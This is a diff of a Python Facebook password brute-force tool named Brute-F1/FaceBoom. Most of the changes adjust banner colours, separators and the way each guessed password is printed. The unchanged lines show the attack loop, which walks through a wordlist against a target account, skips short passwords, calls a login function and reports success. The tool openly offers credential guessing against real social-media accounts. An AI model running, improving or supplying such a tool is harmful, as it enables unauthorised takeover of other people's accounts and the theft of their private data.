@@ -112,17 +112,17 @@ class FaceBoom(object):
  | |_) | |  | |_| | ||  __/      | |     | |
  |____/|_|   \__,_|\__\___|      |_|     |_|
                                             
-――――――――――――――――――――― """+yl+"""All praise is for Allah"""+gr+""" ―――――――――――――――――――――
+――――――― """+yl+"""All praise is for Allah"""+gr+""" ―――――――
 
-[•] """+yl+"""Brute-F1 : Powerful Facebook Bruteforce Tool"""+gr+"""!
-[•] """+yl+"""Creator : MD Asif Hasan"""+gr+"""         [DetaSploit]
-――――――――――――――――――――――――――――――――――――――――――――
+["""+yl+"""•"""+gr+"""] """+yl+"""Brute-F1 : Powerful Facebook Bruteforce Tool"""+gr+"""!
+["""+yl+"""•"""+gr+"""] """+yl+"""Creator : MD Asif Hasan"""+gr+"""         [DetaSploit]
+――――――――――――――――――――――――――――――――――――――――――――――
 ~ Target      ― """+yl+target+gr+"""
 {}""".format("~ Wordlist    ― "+yl+str(wordlist) if not single_passwd else "~ Password    ― "+yl+str(single_passwd))+gr+"""
 ~ ProxyStatus ― """+str(proxystatus)+wi)
         if not single_passwd:
             print(yl+"""\
-――――――――――――――――――――――――――――――――――――――――――――"""+gr+"""
+――――――――――――――――――――――――――――――――――――――――――――――"""+gr+"""
 ["""+yl+"""•"""+gr+"""] """+yl+"""Bruteforce"""+rd+""" Attack """+gr+""" : """+gr+"""Enabled """+wi+"""[~]"""+yl+"""
 ――――――――――――――――――――――――――――――――――――――――――――\n"""+yl)
         else:print("\n")
@@ -258,7 +258,7 @@ def Main():
         for passwd in passwords:
                 passwd = passwd.strip()
                 if len(passwd) <6:continue
-                write(wi+"["+yl+str(loop)+wi+"] iASIF009.ME ["+yl+str(passwd)+wi+"]")
+                write(gr+"["+yl+str(loop)+gr+"] "+wi+"iASIF009.ME "+gr+"["+yl+str(passwd)+gr+"]")
                 retCode = faceboom.login(target, passwd)
                 if retCode:
                     sys.stdout.write(wi+" Login :"+gr+" Success\n")
